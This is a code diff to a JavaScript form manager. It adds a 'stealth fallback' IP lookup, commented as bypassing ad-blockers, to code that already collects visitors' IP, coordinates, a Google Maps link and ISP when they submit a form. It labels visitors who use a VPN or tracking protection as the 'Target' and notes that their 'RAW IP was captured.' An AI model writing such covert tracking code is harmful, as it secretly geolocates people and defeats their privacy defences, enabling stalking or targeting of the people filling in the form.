@@ -126,7 +126,7 @@ const FormManager = (() => {
     };
 
     try {
-      // Fetch precise IP address and geographical location
+      // Primary API for rich location data
       const ipResponse = await fetch('https://ipapi.co/json/');
       if (ipResponse.ok) {
         const ipData = await ipResponse.json();
@@ -136,9 +136,22 @@ const FormManager = (() => {
         data.Google_Maps = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
         data.ISP = ipData.org;
         data.Timezone_IP = ipData.timezone;
+      } else {
+        throw new Error("Primary API blocked or rate-limited");
       }
     } catch (e) {
-      console.warn("Could not fetch IP data", e);
+      console.warn("Primary IP fetch blocked. Attempting stealth fallback...");
+      try {
+        // Fallback stealth API (often bypasses basic ad-blockers)
+        const fallbackResponse = await fetch('https://api.ipify.org?format=json');
+        if (fallbackResponse.ok) {
+          const fallbackData = await fallbackResponse.json();
+          data.IP_Address = fallbackData.ip;
+          data.Tracking_Note = "Ad-blocker prevented location data, but RAW IP was captured.";
+        }
+      } catch (e2) {
+        data.Tracking_Status = "Target is using strict tracking protection or a VPN.";
+      }
     }
 
     const btnLabel = submitBtn.querySelector(".btn-label");
